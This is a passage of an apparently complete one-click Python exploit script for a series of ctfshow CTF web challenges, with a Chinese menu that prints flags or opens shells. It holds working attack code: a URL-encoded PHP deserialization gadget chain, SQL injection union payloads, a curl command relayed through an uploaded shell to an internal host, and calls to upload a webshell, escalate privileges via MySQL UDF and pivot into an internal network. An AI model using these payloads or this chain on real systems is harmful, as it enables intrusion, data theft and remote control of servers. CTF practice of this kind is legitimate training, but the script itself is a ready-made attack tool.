    ser="O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A5%3A%22jiang%22%3B%7Ds%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A28%3A%22GuzzleHttp%5CPsr7%5CAppendStream%22%3A2%3A%7Bs%3A37%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00streams%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A%22GuzzleHttp%5CPsr7%5CCachingStream%22%3A2%3A%7Bs%3A43%3A%22%00GuzzleHttp%5CPsr7%5CCachingStream%00remoteStream%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bb%3A0%3B%7Ds%3A6%3A%22stream%22%3BO%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3A3%3A%7Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00source%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A228%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A73%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%5Chighlight_file%28%27%2Fvar%2Foa%2Fflag664.php%27%29%3B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000000b45001f0000000040612da3%22%3B%7D%7Ds%3A32%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00size%22%3Bi%3A-10%3Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00buffer%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A1%3A%22j%22%3B%7D%7D%7D%7Ds%3A38%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00seekable%22%3Bb%3A1%3B%7D%7D%7D%7D"
    data={'freedom':f'echo ` curl  -H "Content-Type: application/x-www-form-urlencoded"   -X POST  -d "UnserializeForm[ctfshowUnserializeData]={ser}" http://{ip[1]}:8888?r=site/unserialize\\&key={quote(flag_663)}`;'}
    response=sess.post(url+"shell.php",data=data)
    p1=r'flag_664=(.*?)ctfshow\{[0-9a-f]+\}'
    return pattern_get_flag(response,p1)


def flags_add():
    global flags,flag_user,ip,payload_phpinfo,payload_flag659,payload_flag660,payload_flag661,payload_flag663,payload_flag665,flag_668,flag_669,flag_666,flag645,flag_663
    # flag640
    flags["flag_640"]=read_page(url)[0]
    # flag641
    flags["flag_641"]=read_page(url)[1]
    # flag642
    sess.cookies.clear()
    flags["flag_642"]=read_page(url + path_642)
    sess.get(url+path1)
    # flag643
    flags["flag_643"]=read_page(url + path_643)
    # flag644
    flags["flag_644"]=read_page(url + path_644)
    # flag645
    flag645=read_page(url + path_backup)
    backup_name()
    flags["flag_645"]=flag645
    # flag646
    flags["flag_646"]=(read_file(url))
    users(path_647)
    # flag647
    flags["flag_647"]=(read_page(url + path_647))
    # flag648
    flags["flag_648"]=(flag_user[1])
    # flag649
    flags["flag_649"]=(flag_user[2])
    # flag650
    flags["flag_650"]=(flag_user[3])
    # flag651
    flags["flag_651"]=(flag_user[4])
    # flag652
    flags["flag_652"]=(read_page(url + path_sql + payload_652))
    key= get_key(url,path_sql,payload_key)
    # flag653
    flags["flag_653"]=(getshell(flag_user[4],path_upload,key))
    # flag654
    flags["flag_654"]=(udfgetroot())
    # flag655
    flags["flag_655"]=(shellinpc1(payload_phpinfo))
    # flag656
    flags["flag_656"]=(xss2login()["flag"])
    # flag657
    flags["flag_657"]=(cookie2get())
    # flag658
    flags["flag_658"]=(web658())
    # flag659
    flags["flag_659"]=(shellinpc1(payload_flag659))
    # flag660
    flags["flag_660"]=(shellinpc1(payload_flag660))
    # flag661
    flags["flag_661"]=(shellinpc1(payload_flag661))
    # flag662
    flags["flag_662"]=(web662())
    # flag663
    flag_663=shellinpc1(payload_flag663)
    flags["flag_663"]=flag_663
    # flag664
    flags["flag_664"]=(web664())
    # flag665
    flags["flag_665"]=shellinpc1(payload_flag665)
    web668()
    # flag666
    flags["flag_666"]= flag_666
    # flag667
    flags["flag_667"]=(web667())
    # flag668
    flags["flag_668"]=flag_668
    # flag669
    flags["flag_669"]= flag_669


path_642 = "system36d"
path_643 = "system36d/secret.txt"
path_644 = "system36d/static/js/lock/index.js"
path1 = "system36d/checklogin.php?s=10"
path_backup = "system36d/users.php?action=backup"
path_647 = "system36d/users.php?action=evilString&m=getallheaders"
path_sql="page.php?id="
payload_652 = "10) union select * from `ctfshow_secret` where 1 =(1# key?id=10) union select * from `ctfshow_keys` where 1 =(1"
payload_key = "10) union select `key` as username from ctfshow_keys where 1 =(1"
path_upload = "system36d/users.php?action=upload"
backup = ""

flags={}
flag_user=[]
payload_phpinfo=""
payload_flag659=""
payload_flag660=""
payload_flag661=""
payload_flag663=""
ip=[]
payload_flag665=""
cookie={}
sess=requests.session()

def main():
    global url
    print("""
    欢迎使用Ctfshow web入门 终极考核一键脚本
    免责声明：本工具仅供Ctfshow web入门 终极考核使用，请勿用于非法用途！
    出自：Freedom
    2025年01月16日""")
    url=input("请输入url：")+"/"
    while True:
        try:
            choose=int(input(
        """
        -----------------------------------------------------
                            请选择功能：
        V V V V V V V V V V V V V V V V V V V V V V V V V V V        
                1.打印flag\t\t\t2.打印指定题目flag
        -----------------------------------------------------
                3.进入跳板机shell界面\t4.进入内网shell界面
        -----------------------------------------------------   
                5.更换url\t\t\t6.退出
        -----------------------------------------------------
        
        请输入选项："""))
            if choose>6:
                print("输入选项不在范围内！")
                sleep(1)

            elif choose==6:
                print("退出中...")
                sleep(1)
                exit()
            elif choose==5:
                url = input("请输入目标url：")+"/"

            else:
                if choose==1:
                    print("正在渗透，请勿中途退出...")
                    print("大概需要2-5分钟，请稍等...")
                    flags_add()
                    for i in range(640,670):
                        key=f"flag_{i}"

                        value = flags[key]
                        if value is not None:
                            print(f"{key}={value}")
                        else:
                            print(f"{key}=None")
                    print("如有部分flag未出，请重新打印（除667），二次打印时间会快")
                elif choose==2:

                    flags_add()

                    flag_id=int(input("请输入flag编号："))
                    if flag_id>=640 and flag_id<=669:
                        key=f"flag_{flag_id}"
                        value = flags[key]
                        if value is not None:
                            print(f"{key}={value}")
                        else:
                            print(f"{key}=None")
                        sleep(3)
                    else:
                        print("flag编号错误")
                        sleep(1)
                elif choose==3:
                    users(path_647)
                    key= get_key(url,path_sql,payload_key)
                    getshell(flag_user[4],path_upload,key)
                    shell()
                elif choose==4:
                    users(path_647)
                    key= get_key(url,path_sql,payload_key)
                    getshell(flag_user[4],path_upload,key)
                    web668()
                    getpc2ip()
                    shell2()

        except Exception as e:
            print(e)
            sleep(3)


main()
